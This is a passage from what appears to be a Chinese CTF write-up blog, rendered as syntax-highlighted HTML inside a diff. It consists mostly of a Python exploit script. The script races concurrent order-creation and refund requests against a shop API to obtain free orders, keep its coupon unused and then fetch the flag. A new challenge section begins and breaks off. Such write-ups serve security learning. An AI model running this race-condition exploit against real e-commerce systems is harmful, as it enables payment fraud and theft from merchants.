+                <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> <span class="token string">"raw"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"request failed"</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">random_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">"ctf"</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        username <span class="token operator">=</span> random_username<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        email <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">@example.com"</span></span>
+        body <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"Pass1234"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">&#125;</span>
+        data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/register"</span><span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>
+            user <span class="token operator">=</span> d<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Registered user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> user<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] register failed:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_products</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/product/list"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data
+    products <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>
+    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">:</span> p<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> products<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">def</span> <span class="token function">get_coupon_info</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/coupon/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data
+    coupons <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>
+    <span class="token keyword">assert</span> coupons
+    <span class="token keyword">return</span> coupons<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">get_user_balance</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/info"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data
+    <span class="token keyword">return</span> Decimal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_orders</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data
+    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">create_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_id<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    body <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"productId"</span><span class="token punctuation">:</span> product_id<span class="token punctuation">,</span>
+        <span class="token string">"quantity"</span><span class="token punctuation">:</span> quantity<span class="token punctuation">,</span>
+        <span class="token string">"couponId"</span><span class="token punctuation">:</span> coupon_id<span class="token punctuation">,</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/create"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">refund_order</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> order_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"/api/order/refund/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>order_id<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">ensure_coupon_unused</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span>
+
+    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> o <span class="token keyword">in</span> orders<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> o<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"couponId"</span><span class="token punctuation">)</span> <span class="token operator">==</span> coupon_id <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] Restoring coupon by refunding order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> o<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+
+    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">zero_cost_purchase</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> target_name<span class="token punctuation">,</span> max_tries<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    target_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>target_name<span class="token punctuation">]</span>
+    base_pid <span class="token operator">=</span> product_ids<span class="token punctuation">[</span>BASE_PRODUCT_NAME<span class="token punctuation">]</span>
+
+    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> max_tries <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string"> try #</span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+        ensure_coupon_unused<span class="token punctuation">(</span>token<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>
+
+        base_resp <span class="token operator">=</span> create_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span>coupon_id<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">200</span> <span class="token keyword">or</span> <span class="token keyword">not</span> base_resp<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] base order failed:"</span><span class="token punctuation">,</span> base_resp<span class="token punctuation">)</span>
+            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+            <span class="token keyword">continue</span>
+
+        base_order_id <span class="token operator">=</span> base_resp<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+
+        create_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        refund_result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">def</span> <span class="token function">t_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">nonlocal</span> create_result
+            create_result <span class="token operator">=</span> create_order<span class="token punctuation">(</span>
+                token<span class="token punctuation">,</span> target_pid<span class="token punctuation">,</span> quantity<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">,</span> coupon_id<span class="token operator">=</span><span class="token boolean">None</span>
+            <span class="token punctuation">)</span>
+
+        <span class="token keyword">def</span> <span class="token function">t_refund</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">nonlocal</span> refund_result
+            refund_result <span class="token operator">=</span> refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> base_order_id<span class="token punctuation">)</span>
+
+        threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_create<span class="token punctuation">)</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>t_refund<span class="token punctuation">)</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
+            t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>
+            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+        balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        target_order_id <span class="token operator">=</span> <span class="token boolean">None</span>
+        success_create <span class="token operator">=</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> create_result<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
+            <span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> success_create<span class="token punctuation">:</span>
+            target_order_id <span class="token operator">=</span> create_result<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"order"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+
+        orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        has_target_completed <span class="token operator">=</span> <span class="token builtin">any</span><span class="token punctuation">(</span>
+            o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token operator">==</span> target_pid <span class="token keyword">and</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> orders
+        <span class="token punctuation">)</span>
+
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance<span class="token punctuation">&#125;</span></span><span class="token string">, target_completed=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_target_completed<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> has_target_completed<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [+] Got free COMPLETED order for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">True</span>
+
+        <span class="token keyword">if</span> target_order_id<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] refund target order </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_order_id<span class="token punctuation">&#125;</span></span><span class="token string"> to restore balance"</span></span><span class="token punctuation">)</span>
+            refund_order<span class="token punctuation">(</span>token<span class="token punctuation">,</span> target_order_id<span class="token punctuation">)</span>
+            balance_after <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [*] balance after refund=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>balance_after<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> balance_after <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low after refund, give up this user"</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">False</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> balance <span class="token operator">&lt;</span> Decimal<span class="token punctuation">(</span><span class="token string">"4.20"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"  [-] balance too low, give up this user"</span><span class="token punctuation">)</span>
+                <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"  [-] Max tries reached for </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_name<span class="token punctuation">&#125;</span></span><span class="token string">, give up on this user."</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">def</span> <span class="token function">conditions_satisfied</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> product_ids<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    orders <span class="token operator">=</span> get_orders<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    balance <span class="token operator">=</span> get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+
+    completed <span class="token operator">=</span> <span class="token punctuation">[</span>o <span class="token keyword">for</span> o <span class="token keyword">in</span> orders <span class="token keyword">if</span> o<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"COMPLETED"</span><span class="token punctuation">]</span>
+    completed_pids <span class="token operator">=</span> <span class="token punctuation">&#123;</span>o<span class="token punctuation">[</span><span class="token string">"productId"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> o <span class="token keyword">in</span> completed<span class="token punctuation">&#125;</span>
+    has_all_products <span class="token operator">=</span> <span class="token builtin">all</span><span class="token punctuation">(</span>pid <span class="token keyword">in</span> completed_pids <span class="token keyword">for</span> pid <span class="token keyword">in</span> product_ids<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    has_balance_10 <span class="token operator">=</span> balance <span class="token operator">==</span> Decimal<span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span>
+    has_unused_coupon <span class="token operator">=</span> <span class="token keyword">not</span> coupon<span class="token punctuation">[</span><span class="token string">"isUsed"</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">return</span> has_all_products<span class="token punctuation">,</span> has_balance_10<span class="token punctuation">,</span> has_unused_coupon<span class="token punctuation">,</span> orders
+
+<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/flag/get"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] /api/flag/get:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> data
+
+<span class="token keyword">def</span> <span class="token function">exploit_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user_id<span class="token punctuation">,</span> token <span class="token operator">=</span> register_user<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    products <span class="token operator">=</span> get_products<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>
+        <span class="token keyword">assert</span> name <span class="token keyword">in</span> products<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"product </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> not found"</span></span>
+
+    coupon <span class="token operator">=</span> get_coupon_info<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    coupon_id <span class="token operator">=</span> coupon<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>
+        <span class="token string-interpolation"><span class="token string">f"[+] User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_id=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>coupon_id<span class="token punctuation">&#125;</span></span><span class="token string">, balance=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_user_balance<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> name <span class="token keyword">in</span> TARGET_PRODUCTS<span class="token punctuation">:</span>
+        ok <span class="token operator">=</span> zero_cost_purchase<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> ok<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+    has_all<span class="token punctuation">,</span> has_bal10<span class="token punctuation">,</span> has_unused<span class="token punctuation">,</span> _ <span class="token operator">=</span> conditions_satisfied<span class="token punctuation">(</span>token<span class="token punctuation">,</span> products<span class="token punctuation">,</span> coupon_id<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>
+        <span class="token string-interpolation"><span class="token string">f"[+] Final check: products=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_all<span class="token punctuation">&#125;</span></span><span class="token string">, balance10=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_bal10<span class="token punctuation">&#125;</span></span><span class="token string">, coupon_unused=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>has_unused<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+    <span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> has_all <span class="token keyword">and</span> has_bal10 <span class="token keyword">and</span> has_unused<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Conditions satisfied, requesting flag..."</span><span class="token punctuation">)</span>
+        get_flag<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> attempt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"===== Attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string"> ====="</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> exploit_once<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] Error in attempt </span><span class="token interpolation"><span class="token punctuation">&#123;</span>attempt<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>本地配置高了反而复现不了（）</p>
 <hr>
 <h1 id="photographer"><a href="#photographer" class="headerlink" title="photographer"></a>photographer</h1><p>直接看获取 flag 的代码 superadmin.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
